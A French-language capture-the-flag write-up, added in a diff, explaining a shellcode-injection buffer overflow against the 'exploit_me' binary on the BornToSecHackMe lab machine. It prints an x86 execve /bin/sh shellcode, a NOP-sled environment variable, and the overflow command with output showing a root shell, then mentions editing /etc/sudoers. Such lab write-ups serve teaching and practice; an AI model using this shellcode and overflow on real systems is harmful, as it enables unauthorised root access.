@@ -1,0 +1,53 @@
+il y a une alternative à l'attaque de type return to lib C dans le cas de l'executable exploit_me 
+sur la session de zaz
+
+on peut faire aussi l'injection d'un shellcode 
+
+Un shellcode est une chaîne de caractères qui représente un code binaire exécutable destiné à lancer un 
+shell ('bin/sh')
+
+via l'extension pela de gdb on peut taper la commande 'shellcode generate x86/linux exec'
+
+gdb-peda$ shellcode generate x86/linux exec
+
+# x86/linux/exec: 24 bytes
+shellcode = (
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
+    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
+)
+
+
+on a ainsi notre shellcode, 
+
+on va mettre ce shellcode dans une variable d'environnement, puis l'adresse de cette variable d'environnement sera injecté par nos soins dans l'execution 
+
+export SHELLCODE=$'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'
+ 
+on écrit (voir script) un programme qui renvoie la valeur de l'adresse d'une variable d'environnement qu'on a passé en argument (en l'occurrence SHELLCODE)
+
+gcc writeup5.c
+
+zaz@BornToSecHackMe:~$ ./a.out SHELLCODE
+0xbffff8e9
+
+la conversion endian donne \xe9\xf8\xff\xbf 
+
+
+on utilise des NOP (No Operation) ou \x90 En assembleur, cette instruction veut dire ne fait rien avec moi, passe à l’instruction suivante.
+cette méthode est moins élégante mais plus souple 
+En effet, si on tombe au milieu des NOP, alors le programme va aller à l’instruction suivante, qui est un NOP, puis la suivante etc. jusqu’à arriver au début du shellcode, et va l’exécuter dans son intégralité. 
+
+./exploit_me $(python -c 'print "\x90" * 140 + "\xe9\xf8\xff\xbf"')
+
+
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "\x90" * 140 + "\xe9\xf8\xff\xbf"')
+������������������������������������������������������������������������������������������������������������������������������������������������
+#
+
+# whoami
+root
+#
+
+on a un shell avec les droits root 
+a partir de là on peut reprendre la suite du writeup1 pour changer le chmod /etc/sudoers et on est root 
+
